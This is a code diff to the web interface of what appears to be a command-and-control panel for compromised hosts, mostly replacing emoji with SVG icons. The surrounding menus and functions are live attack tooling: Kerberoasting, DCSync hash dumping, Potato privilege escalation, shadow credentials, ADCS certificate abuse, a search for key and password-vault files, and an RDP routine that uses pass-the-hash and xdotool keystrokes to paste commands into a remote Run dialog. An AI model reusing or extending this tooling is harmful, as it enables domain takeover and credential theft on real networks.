@@ -2128,10 +2128,10 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
         <!-- Filter buttons -->
         <div id="bh-filters" style="padding:0 12px 8px;display:none;flex-wrap:wrap;gap:4px">
           <button class="btn btn-ghost btn-sm bh-filter-btn active" data-type="all" onclick="bhSetFilter(this,'all')" style="font-size:10px;padding:2px 8px">All</button>
-          <button class="btn btn-ghost btn-sm bh-filter-btn" data-type="computer" onclick="bhSetFilter(this,'computer')" style="font-size:10px;padding:2px 8px;color:#4fc3f7">💻 Computers</button>
-          <button class="btn btn-ghost btn-sm bh-filter-btn" data-type="user" onclick="bhSetFilter(this,'user')" style="font-size:10px;padding:2px 8px;color:#81c995">👤 Users</button>
-          <button class="btn btn-ghost btn-sm bh-filter-btn" data-type="group" onclick="bhSetFilter(this,'group')" style="font-size:10px;padding:2px 8px;color:#ce93d8">👥 Groups</button>
-          <button class="btn btn-ghost btn-sm bh-filter-btn" data-type="domain" onclick="bhSetFilter(this,'domain')" style="font-size:10px;padding:2px 8px;color:#ef9a9a">🌐 Domains</button>
+          <button class="btn btn-ghost btn-sm bh-filter-btn" data-type="computer" onclick="bhSetFilter(this,'computer')" style="font-size:10px;padding:2px 8px;color:#4fc3f7;display:inline-flex;align-items:center;gap:4px"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512" width="11" height="11" fill="currentColor"><path d="M64 0C28.7 0 0 28.7 0 64L0 352c0 35.3 28.7 64 64 64l176 0-10.7 32L160 448c-17.7 0-32 14.3-32 32s14.3 32 32 32l256 0c17.7 0 32-14.3 32-32s-14.3-32-32-32l-69.3 0L336 416l176 0c35.3 0 64-28.7 64-64l0-288c0-35.3-28.7-64-64-64L64 0zM512 64l0 224L64 288 64 64l448 0z"/></svg>Computers</button>
+          <button class="btn btn-ghost btn-sm bh-filter-btn" data-type="user" onclick="bhSetFilter(this,'user')" style="font-size:10px;padding:2px 8px;color:#81c995;display:inline-flex;align-items:center;gap:4px"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" width="10" height="11" fill="currentColor"><path d="M224 256A128 128 0 1 0 224 0a128 128 0 1 0 0 256zm-45.7 48C79.8 304 0 383.8 0 482.3C0 498.7 13.3 512 29.7 512l388.6 0c16.4 0 29.7-13.3 29.7-29.7C448 383.8 368.2 304 269.7 304l-91.4 0z"/></svg>Users</button>
+          <button class="btn btn-ghost btn-sm bh-filter-btn" data-type="group" onclick="bhSetFilter(this,'group')" style="font-size:10px;padding:2px 8px;color:#ce93d8;display:inline-flex;align-items:center;gap:4px"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512" width="13" height="11" fill="currentColor"><path d="M144 0a80 80 0 1 1 0 160A80 80 0 1 1 144 0zM512 0a80 80 0 1 1 0 160A80 80 0 1 1 512 0zM0 298.7C0 239.8 47.8 192 106.7 192l42.7 0c15.9 0 31 3.5 44.6 9.7c-1.3 7.2-1.9 14.7-1.9 22.3c0 38.2 16.8 72.5 43.3 96c-.2 0-.4 0-.7 0L21.3 320C9.6 320 0 310.4 0 298.7zM405.3 320c-.2 0-.4 0-.7 0c26.6-23.5 43.3-57.8 43.3-96c0-7.6-.7-15-1.9-22.3c13.6-6.3 28.7-9.7 44.6-9.7l42.7 0C592.2 192 640 239.8 640 298.7c0 11.8-9.6 21.3-21.3 21.3l-213.3 0zM224 224a96 96 0 1 1 192 0 96 96 0 1 1 -192 0zM128 485.3C128 411.7 187.7 352 261.3 352l117.3 0C452.3 352 512 411.7 512 485.3c0 14.7-11.9 26.7-26.7 26.7l-330.7 0c-14.7 0-26.7-11.9-26.7-26.7z"/></svg>Groups</button>
+          <button class="btn btn-ghost btn-sm bh-filter-btn" data-type="domain" onclick="bhSetFilter(this,'domain')" style="font-size:10px;padding:2px 8px;color:#ef9a9a;display:inline-flex;align-items:center;gap:4px"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" width="11" height="11" fill="currentColor"><path d="M352 256c0 22.2-1.2 43.6-3.3 64l-185.3 0c-2.2-20.4-3.3-41.8-3.3-64s1.2-43.6 3.3-64l185.3 0c2.2 20.4 3.3 41.8 3.3 64zm28.8-64l123.1 0c5.3 20.5 8.1 41.9 8.1 64s-2.8 43.5-8.1 64l-123.1 0c2.1-20.6 3.2-42 3.2-64s-1.1-43.4-3.2-64zm112.6-32l-116.7 0c-10-63.9-29.8-117.4-55.3-151.6c78.3 20.7 142 77.5 171.9 151.6zm-149.1 0l-176.6 0c6.1-36.4 15.5-68.6 27-94.7c10.5-23.6 22.2-40.7 33.5-51.5C239.4 3.2 248.7 0 256 0s16.6 3.2 27.8 13.8c11.3 10.8 23 27.9 33.5 51.5c11.6 26 20.9 58.2 27 94.7zm-209 0L18.6 160C48.6 85.9 112.2 29.1 190.6 8.4C165.1 42.6 145.3 96.1 135.3 160zM8.1 192l123.1 0c-2.1 20.6-3.2 42-3.2 64s1.1 43.4 3.2 64L8.1 320C2.8 299.5 0 278.1 0 256s2.8-43.5 8.1-64zM194.7 446.6c-11.6-26-20.9-58.2-27-94.6l176.6 0c-6.1 36.4-15.5 68.6-27 94.6c-10.5 23.6-22.2 40.7-33.5 51.5C272.6 508.8 263.3 512 256 512s-16.6-3.2-27.8-13.8c-11.3-10.8-23-27.9-33.5-51.5zM135.3 352c10 63.9 29.8 117.4 55.3 151.6C112.2 482.9 48.6 426.1 18.6 352l116.7 0zm358.1 0c-30 74.1-93.6 130.9-171.9 151.6c25.5-34.2 45.2-87.7 55.3-151.6l116.7 0z"/></svg>Domains</button>
         </div>
 
         <!-- Legend -->
@@ -2921,6 +2921,38 @@ let graphPan  = {x: 0, y: 0};
 let graphZoom = 1.0;
 let graphEdgeMode = localStorage.getItem('c2_graph_edge') || 'animated';
 
+// ── BH / FA Icon SVGs for context menus & filter buttons ─────────────────────
+// Custom icons © SpecterOps Inc., Apache 2.0 (github.com/SpecterOps/BloodHound)
+// Key / DB / Ghost / Search: FontAwesome Free 6, CC BY 4.0 (fontawesome.com)
+const _bhSvg = (inner, vb, w=14, h=14) =>
+  `<svg xmlns="http://www.w3.org/2000/svg" viewBox="${vb}" width="${w}" height="${h}" fill="currentColor" style="flex-shrink:0;vertical-align:-2px">${inner}</svg>`;
+const _p = d => `<path d="${d}"/>`;
+
+const IC_ATTACK_PATHS = _bhSvg(_p('M567.273 506.183l122.181-122.181-122.181-122.181v91.637h-154.561c-10.386-94.691-69.033-174.722-150.894-215.345-1.221-50.094-41.541-90.11-91.637-90.11-50.706 0-91.636 40.93-91.636 91.636s40.93 91.637 91.636 91.637c29.019 0 54.371-13.745 71.171-34.822 58.036 31.767 99.883 88.886 109.659 157.004h-94.691c-12.829-35.432-46.429-61.090-86.138-61.090-50.706 0-91.636 40.93-91.636 91.636s40.93 91.637 91.636 91.637c39.71 0 73.309-25.658 86.138-61.091h94.691c-9.774 68.116-51.621 125.236-109.353 157.004-17.105-21.077-42.458-34.822-71.477-34.822-50.706 0-91.636 40.93-91.636 91.636s40.93 91.637 91.636 91.637c50.094 0 90.414-40.014 91.331-90.11 81.861-40.626 140.51-120.654 150.894-215.345h154.865v91.637z'), '0 0 768 768');
+
+const IC_CERT = _bhSvg(
+  _p('M3.93549 12.0002C3.93549 12.5347 3.50224 12.9679 2.96775 12.9679C2.43325 12.9679 2 12.5347 2 12.0002C2 11.4657 2.43325 11.0324 2.96775 11.0324C3.50224 11.0324 3.93549 11.4657 3.93549 12.0002Z') +
+  _p('M4.74091 6.64696C5.20368 6.9142 5.36233 7.50602 5.0951 7.96889C4.82787 8.43177 4.23593 8.59032 3.77316 8.32319C3.31028 8.05595 3.15163 7.46403 3.41886 7.00115C3.68609 6.53828 4.27803 6.37973 4.74091 6.64696Z') +
+  _p('M8.3207 3.7733C8.58794 4.23618 8.42928 4.82798 7.9665 5.09524C7.50363 5.36248 6.91172 5.20392 6.64446 4.74104C6.3772 4.27817 6.53588 3.68626 6.99876 3.419C7.46153 3.15186 8.05344 3.31042 8.3207 3.7733Z') +
+  _p('M7.96641 18.905C8.42929 19.1722 8.58795 19.7642 8.32071 20.2269C8.05347 20.6898 7.46154 20.8485 6.99867 20.5812C6.53579 20.314 6.37724 19.7221 6.64447 19.2592C6.91171 18.7964 7.50353 18.6378 7.96641 18.905Z') +
+  _p('M5.09506 16.0311C5.3623 16.494 5.20374 17.0858 4.74086 17.353C4.27799 17.6203 3.68608 17.4617 3.41882 16.9988C3.15168 16.5359 3.31024 15.944 3.77312 15.6768C4.236 15.4095 4.8278 15.5682 5.09506 16.0311Z') +
+  _p('M12 2.00016V3.93565C14.1389 3.93565 16.1901 4.78524 17.7024 6.29766C19.2149 7.81008 20.0645 9.86137 20.0645 12.0001C20.0645 14.1388 19.2149 16.1901 17.7024 17.7025C16.19 19.2149 14.1387 20.0645 12 20.0645V22C14.6522 22 17.1957 20.9465 19.071 19.071C20.9464 17.1956 22 14.6522 22 12C22 9.34785 20.9465 6.8043 19.071 4.92903C17.1957 3.0536 14.6522 2 12 2V2.00016Z') +
+  _p('M15.1871 8.73564L10.7096 13.2131L8.49028 10.9937L7.12256 12.3614L10.0258 15.2647H10.0257C10.2071 15.4458 10.4532 15.5477 10.7096 15.5477C10.966 15.5477 11.212 15.4458 11.3935 15.2647L16.5548 10.1034L15.1871 8.73564Z'),
+  '0 0 24 24');
+
+const IC_SHIELD = _bhSvg(
+  _p('M5.14211 7.87826L3.86914 9.15123L6.27194 11.554L6.27077 11.5552C6.62275 11.906 7.19294 11.906 7.54492 11.5552L12.0502 7.04995L10.7772 5.77698L6.90778 9.64519L5.14211 7.87826Z') +
+  _p('M8.40981 0.207665L7.80911 0L7.20841 0.207665L1.2014 2.31012L0 2.73367V9.97272C0.00234634 11.3173 0.391867 12.6336 1.1228 13.7622C1.85373 14.8921 2.89439 15.7861 4.12045 16.3398L7.06998 17.668L7.80911 18L8.54824 17.6668L11.4978 16.3387V16.3398C12.7238 15.7861 13.7657 14.8909 14.4966 13.7611C15.2264 12.6312 15.617 11.3149 15.6182 9.96914V2.7301L14.4168 2.30655L8.40981 0.207665ZM13.8161 9.96905C13.8161 10.9675 13.5275 11.946 12.9855 12.7837C12.4423 13.6225 11.6691 14.2866 10.7586 14.6961L7.80911 16.0242L4.85958 14.6961C3.94916 14.2866 3.17596 13.6225 2.63275 12.7837C2.09071 11.946 1.8021 10.9675 1.8021 9.96905V4.0101L7.80911 1.90765L13.8161 4.0101V9.96905Z'),
+  '0 0 15.6 18');
+
+const IC_KEY = _bhSvg(_p('M336 352c97.2 0 176-78.8 176-176S433.2 0 336 0S160 78.8 160 176c0 18.7 2.9 36.8 8.3 53.7L7 391c-4.5 4.5-7 10.6-7 17l0 80c0 13.3 10.7 24 24 24l80 0c13.3 0 24-10.7 24-24l0-40 40 0c13.3 0 24-10.7 24-24l0-40 40 0c6.4 0 12.5-2.5 17-7l33.3-33.3c16.9 5.4 35 8.3 53.7 8.3zM376 96a40 40 0 1 1 0 80 40 40 0 1 1 0-80z'), '0 0 512 512');
+
+const IC_DB = _bhSvg(_p('M448 80v48c0 44.2-100.3 80-224 80S0 172.2 0 128V80C0 35.8 100.3 0 224 0S448 35.8 448 80zM393.2 214.7c20.8-7.4 39.9-16.9 54.8-28.6V288c0 44.2-100.3 80-224 80S0 332.2 0 288V186.1c14.9 11.8 34 21.2 54.8 28.6C99.7 230.7 159.5 240 224 240s124.3-9.3 169.2-25.3zM0 346.1c14.9 11.8 34 21.2 54.8 28.6C99.7 390.7 159.5 400 224 400s124.3-9.3 169.2-25.3c20.8-7.4 39.9-16.9 54.8-28.6V432c0 44.2-100.3 80-224 80S0 476.2 0 432V346.1z'), '0 0 448 512');
+
+const IC_GHOST = _bhSvg(_p('M40.1 467.1l-11.2 9c-3.2 2.5-7.1 3.9-11.1 3.9C8 480 0 472 0 462.2L0 192C0 86 86 0 192 0S384 86 384 192l0 270.2c0 9.8-8 17.8-17.8 17.8c-4 0-7.9-1.4-11.1-3.9l-11.2-9c-3.9-3.1-8.6-4.8-13.4-4.8c-5.5 0-10.8 2.1-14.8 5.9l-17.4 16.6c-3.9 3.7-9 5.8-14.3 5.8s-10.4-2.1-14.3-5.8l-17.4-16.6c-4-3.8-9.3-5.9-14.8-5.9s-10.8 2.1-14.8 5.9l-17.4 16.6c-3.9 3.7-9 5.8-14.3 5.8s-10.4-2.1-14.3-5.8l-17.4-16.6c-4-3.8-9.3-5.9-14.8-5.9c-4.8 0-9.5 1.7-13.4 4.8zM176 192a32 32 0 1 0 -64 0 32 32 0 1 0 64 0zm96 32a32 32 0 1 0 0-64 32 32 0 1 0 0 64z'), '0 0 384 512', 12, 14);
+
+const IC_SEARCH = _bhSvg(_p('M416 208c0 45.9-14.9 88.3-40 122.7L502.6 457.4c12.5 12.5 12.5 32.8 0 45.3s-32.8 12.5-45.3 0L330.7 376c-34.4 25.2-76.8 40-122.7 40C93.1 416 0 322.9 0 208S93.1 0 208 0S416 93.1 416 208zM208 352a144 144 0 1 0 0-288 144 144 0 1 0 0 288z'), '0 0 512 512');
+
 // ── Context Menu System ────────────────────────────────────────────────────────
 const ctxMenu = document.getElementById ? (() => document.getElementById('ctx-menu'))() : null;
 
@@ -2929,9 +2961,11 @@ function _renderCtxItems(items) {
     if (it === null) return '<div class="ctx-sep"></div>';
     if (it._header) return `<div class="ctx-header">${esc(it._header)}</div>`;
     if (it._sub) {
-      return `<div class="ctx-item has-sub">${esc(it._sub)}<div class="ctx-submenu">${_renderCtxItems(it.items)}</div></div>`;
+      const ic = it._icon ? it._icon : '';
+      return `<div class="ctx-item has-sub">${ic}${esc(it._sub)}<div class="ctx-submenu">${_renderCtxItems(it.items)}</div></div>`;
     }
-    return `<div class="ctx-item${it.danger?' danger':''}" data-action='${JSON.stringify(it.action)}'>${it.label}</div>`;
+    const ic = it._icon ? it._icon : '';
+    return `<div class="ctx-item${it.danger?' danger':''}" data-action='${JSON.stringify(it.action)}'>${ic}${it.label}</div>`;
   }).join('');
 }
 
@@ -4134,8 +4168,8 @@ function agentContextMenu(e, agentId) {
       null,
       {label:'🥔  SeImpersonate → SYSTEM (Potato)…', action:{fn:'potatoPrivesc', id}},
     ]},
-    {_sub:'🔑  AD Attacks', items:[
-      {_sub:'🎫  Rubeus (Kerberos)', items:[
+    {_sub:'AD Attacks', _icon:IC_ATTACK_PATHS, items:[
+      {_sub:'Rubeus (Kerberos)', _icon:IC_KEY, items:[
         {label:'Kerberoast — TGS hashes (all SPNs)',  action:{fn:'rubeusKerberoast', id}},
         {label:'AS-REP Roast — no-preauth users',     action:{fn:'rubeusASREP',      id}},
         {label:'Dump — list current tickets',         action:{fn:'rubeusDump',       id}},
@@ -4144,11 +4178,11 @@ function agentContextMenu(e, agentId) {
         {label:'Pass-the-Ticket…',                    action:{fn:'rubeusPTT',        id}},
         {label:'Custom Rubeus command…',              action:{fn:'rubeusCustom',     id}},
       ]},
-      {_sub:'🩸  DCSync (SharpKatz)', items:[
+      {_sub:'DCSync (SharpKatz)', _icon:IC_DB, items:[
         {label:'DCSync — all hashes…',         action:{fn:'dcsyncAll',  id}},
         {label:'DCSync — target user/krbtgt…', action:{fn:'dcsyncUser', id}},
       ]},
-      {_sub:'🐺  BloodHound (SharpHound)', items:[
+      {_sub:'BloodHound (SharpHound)', _icon:IC_ATTACK_PATHS, items:[
         {label:'Collect All',           action:{fn:'bloodhoundCollect', id, method:'All'}},
         {label:'Collect Session only (stealthy)', action:{fn:'bloodhoundCollect', id, method:'Session', stealth:true}},
         {label:'Collect DC only',       action:{fn:'bloodhoundCollect', id, method:'DCOnly'}},
@@ -4158,7 +4192,7 @@ function agentContextMenu(e, agentId) {
         {label:'⚡ Auto-importar último ZIP',  action:{fn:'bhAutoImport',        id}},
         {label:'📥 Importar ZIP de uploads…',  action:{fn:'bhImportFromUploads', id}},
       ]},
-      {_sub:'📜  ADCS (Certify)', items:[
+      {_sub:'ADCS (Certify)', _icon:IC_CERT, items:[
         {label:'Find vulnerable templates',   action:{fn:'certifyFind', id, vulnerable:true}},
         {label:'Find all templates',          action:{fn:'certifyFind', id, vulnerable:false}},
         {label:'Enumerate CAs',               action:{fn:'certifyCAs',  id}},
@@ -4166,14 +4200,14 @@ function agentContextMenu(e, agentId) {
         {label:'Request certificate (ESC1)…', action:{fn:'certifyRequest', id}},
         {label:'Custom Certify command…',     action:{fn:'certifyCustom', id}},
       ]},
-      {_sub:'👻  Shadow Creds (Whisker)', items:[
+      {_sub:'Shadow Creds (Whisker)', _icon:IC_GHOST, items:[
         {label:'List shadow creds…',   action:{fn:'whiskerOp', id, op:'list'}},
         {label:'Add shadow cred…',     action:{fn:'whiskerOp', id, op:'add'}},
         {label:'Remove shadow cred…',  action:{fn:'whiskerOp', id, op:'remove'}},
         {label:'Clear all…',           action:{fn:'whiskerOp', id, op:'clear'}},
       ]},
       null,
-      {label:'🔍  AD — passwords in descriptions', action:{fn:'adPassDesc', id}},
+      {label:'AD — passwords in descriptions', _icon:IC_SEARCH, action:{fn:'adPassDesc', id}},
     ]},
     {_sub:'🔎  File Search', items:[
       {label:'🔑  Sensitive files (kdbx/pfx/key)', action:{fn:'searchFiles', id, pattern:'*.kdbx *.pfx *.pem *.key id_rsa *.p12'}},
@@ -16089,7 +16123,7 @@ async function ipcRun(action) {
     const usePTH   = method === 'rdp-drive-pth' && ntHash;
     const rdpCreds = usePTH ? `/pth:${ntHash} /restricted-admin` : `/p:'${a.pass}'`;
     const rdpDom   = a.domain ? ` /d:'${a.domain}'` : '';
-    const rdpBase  = `DISPLAY=:0 xfreerdp /v:${a.target}${rdpDom} /u:'${a.user}' ${rdpCreds} /cert:ignore`;
+    const rdpBase  = `DISPLAY=\${DISPLAY:-:1} XAUTHORITY=\${XAUTHORITY:-\$HOME/.Xauthority} xfreerdp /v:${a.target}${rdpDom} /u:'${a.user}' ${rdpCreds} /cert:ignore`;
     // minimum 200x200 enforced by xfreerdp; +disable-output prevents graphics decoding
     const rdpTail  = `/w:200 /h:200 +disable-output -decorations /log-level:OFF`;
 
@@ -16130,24 +16164,25 @@ async function ipcRun(action) {
       const winCmdEsc = winCmd.replace(/'/g, "'\\''");   // escapa ' para bash single-quote
       const rdpVis    = `${rdpBase} /w:800 /h:600 /log-level:OFF`;
       const steps = [
+        `export DISPLAY=\${DISPLAY:-:1} XAUTHORITY=\${XAUTHORITY:-\$HOME/.Xauthority}`,
         `${rdpVis} & XPID=$!`,
         `sleep 10`,
-        `WID=$(DISPLAY=:0 xdotool search --pid $XPID 2>/dev/null | head -1)`,
-        `[ -z "$WID" ] && WID=$(DISPLAY=:0 xdotool search --class xfreerdp 2>/dev/null | tail -1)`,
+        `WID=$(xdotool search --pid $XPID 2>/dev/null | head -1)`,
+        `[ -z "$WID" ] && WID=$(xdotool search --class xfreerdp 2>/dev/null | tail -1)`,
         `echo "[*] RDP window=$WID pid=$XPID"`,
-        `printf '%s' '${winCmdEsc}' | DISPLAY=:0 xclip -selection clipboard`,
+        `printf '%s' '${winCmdEsc}' | xclip -selection clipboard`,
         `sleep 1`,
-        `DISPLAY=:0 xdotool windowfocus --sync "$WID"`,
+        `xdotool windowfocus --sync "$WID"`,
         `sleep 0.3`,
-        `DISPLAY=:0 xdotool key --window "$WID" Escape`,
+        `xdotool key --window "$WID" Escape`,
         `sleep 0.5`,
-        `DISPLAY=:0 xdotool key --window "$WID" super+r`,
+        `xdotool key --window "$WID" super+r`,
         `sleep 2`,
-        `DISPLAY=:0 xdotool key --window "$WID" ctrl+a`,
+        `xdotool key --window "$WID" ctrl+a`,
         `sleep 0.3`,
-        `DISPLAY=:0 xdotool key --window "$WID" ctrl+v`,
+        `xdotool key --window "$WID" ctrl+v`,
         `sleep 0.5`,
-        `DISPLAY=:0 xdotool key --window "$WID" Return`,
+        `xdotool key --window "$WID" Return`,
         `sleep 10`,
         `kill $XPID 2>/dev/null`,
         `echo "[+] rdp-inject done"`,
@@ -16704,11 +16739,37 @@ function bhNodeColor(n) {
 function bhEdgeColor(type) { return BH_EDGE_COLORS[type] || '#90a4ae'; }
 function safeParseProps(s) { try { return JSON.parse(s||'{}'); } catch(e) { return {}; } }
 
+// ── Canvas node icons (FontAwesome Free 6, CC BY 4.0) ────────────────────────
+const BH_NODE_SVGS = {
+  computer: ['0 0 576 512', 'M64 0C28.7 0 0 28.7 0 64L0 352c0 35.3 28.7 64 64 64l176 0-10.7 32L160 448c-17.7 0-32 14.3-32 32s14.3 32 32 32l256 0c17.7 0 32-14.3 32-32s-14.3-32-32-32l-69.3 0L336 416l176 0c35.3 0 64-28.7 64-64l0-288c0-35.3-28.7-64-64-64L64 0zM512 64l0 224L64 288 64 64l448 0z'],
+  user:     ['0 0 448 512', 'M224 256A128 128 0 1 0 224 0a128 128 0 1 0 0 256zm-45.7 48C79.8 304 0 383.8 0 482.3C0 498.7 13.3 512 29.7 512l388.6 0c16.4 0 29.7-13.3 29.7-29.7C448 383.8 368.2 304 269.7 304l-91.4 0z'],
+  group:    ['0 0 640 512', 'M144 0a80 80 0 1 1 0 160A80 80 0 1 1 144 0zM512 0a80 80 0 1 1 0 160A80 80 0 1 1 512 0zM0 298.7C0 239.8 47.8 192 106.7 192l42.7 0c15.9 0 31 3.5 44.6 9.7c-1.3 7.2-1.9 14.7-1.9 22.3c0 38.2 16.8 72.5 43.3 96c-.2 0-.4 0-.7 0L21.3 320C9.6 320 0 310.4 0 298.7zM405.3 320c-.2 0-.4 0-.7 0c26.6-23.5 43.3-57.8 43.3-96c0-7.6-.7-15-1.9-22.3c13.6-6.3 28.7-9.7 44.6-9.7l42.7 0C592.2 192 640 239.8 640 298.7c0 11.8-9.6 21.3-21.3 21.3l-213.3 0zM224 224a96 96 0 1 1 192 0 96 96 0 1 1 -192 0zM128 485.3C128 411.7 187.7 352 261.3 352l117.3 0C452.3 352 512 411.7 512 485.3c0 14.7-11.9 26.7-26.7 26.7l-330.7 0c-14.7 0-26.7-11.9-26.7-26.7z'],
+  domain:   ['0 0 512 512', 'M352 256c0 22.2-1.2 43.6-3.3 64l-185.3 0c-2.2-20.4-3.3-41.8-3.3-64s1.2-43.6 3.3-64l185.3 0c2.2 20.4 3.3 41.8 3.3 64zm28.8-64l123.1 0c5.3 20.5 8.1 41.9 8.1 64s-2.8 43.5-8.1 64l-123.1 0c2.1-20.6 3.2-42 3.2-64s-1.1-43.4-3.2-64zm112.6-32l-116.7 0c-10-63.9-29.8-117.4-55.3-151.6c78.3 20.7 142 77.5 171.9 151.6zm-149.1 0l-176.6 0c6.1-36.4 15.5-68.6 27-94.7c10.5-23.6 22.2-40.7 33.5-51.5C239.4 3.2 248.7 0 256 0s16.6 3.2 27.8 13.8c11.3 10.8 23 27.9 33.5 51.5c11.6 26 20.9 58.2 27 94.7zm-209 0L18.6 160C48.6 85.9 112.2 29.1 190.6 8.4C165.1 42.6 145.3 96.1 135.3 160zM8.1 192l123.1 0c-2.1 20.6-3.2 42-3.2 64s1.1 43.4 3.2 64L8.1 320C2.8 299.5 0 278.1 0 256s2.8-43.5 8.1-64zM194.7 446.6c-11.6-26-20.9-58.2-27-94.6l176.6 0c-6.1 36.4-15.5 68.6-27 94.6c-10.5 23.6-22.2 40.7-33.5 51.5C272.6 508.8 263.3 512 256 512s-16.6-3.2-27.8-13.8c-11.3-10.8-23-27.9-33.5-51.5zM135.3 352c10 63.9 29.8 117.4 55.3 151.6C112.2 482.9 48.6 426.1 18.6 352l116.7 0zm358.1 0c-30 74.1-93.6 130.9-171.9 151.6c25.5-34.2 45.2-87.7 55.3-151.6l116.7 0z'],
+};
+const BH_ICON_IMGS = {};
+
+function bhPreloadIcons(cb) {
+  const types = Object.keys(BH_NODE_SVGS);
+  let loaded = 0;
+  for (const t of types) {
+    const [vb, d] = BH_NODE_SVGS[t];
+    const svg = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="${vb}"><path fill="white" d="${d}"/></svg>`;
+    const blob = new Blob([svg], {type:'image/svg+xml'});
+    const url  = URL.createObjectURL(blob);
+    const img  = new Image();
+    img.onload = () => { URL.revokeObjectURL(url); if (++loaded === types.length && cb) cb(); };
+    img.onerror = () => { URL.revokeObjectURL(url); ++loaded; };
+    img.src = url;
+    BH_ICON_IMGS[t] = img;
+  }
+}
+
 // ── Entry point ───────────────────────────────────────────────────────────────
 let bhInitDone = false;
 async function bhInit() {
   if (!bhInitDone) {
     bhInitDone = true;
+    bhPreloadIcons();
     bhSetupCanvas();
   }
   await bhReload();
@@ -16960,11 +17021,17 @@ function bhDraw() {
     }
 
     // Icon + label
-    const icon = {computer:'💻', user:'👤', group:'👥', domain:'🌐'}[n.type] || '●';
-    ctx.font = `${10/bh.scale}px system-ui`;
-    ctx.fillStyle = '#fff';
+    const bhImg = BH_ICON_IMGS[n.type];
     ctx.globalAlpha = 0.9;
-    ctx.fillText(icon, n.x, n.y - 2/bh.scale);
+    if (bhImg && bhImg.complete && bhImg.naturalWidth > 0) {
+      const sz = R * 1.15;
+      ctx.drawImage(bhImg, n.x - sz/2, n.y - sz/2 - 1/bh.scale, sz, sz);
+    } else {
+      const fallback = {computer:'💻', user:'👤', group:'👥', domain:'🌐'}[n.type] || '●';
+      ctx.font = `${10/bh.scale}px system-ui`;
+      ctx.fillStyle = '#fff';
+      ctx.fillText(fallback, n.x, n.y - 2/bh.scale);
+    }
     ctx.globalAlpha = 1;
 
     // Short name below node
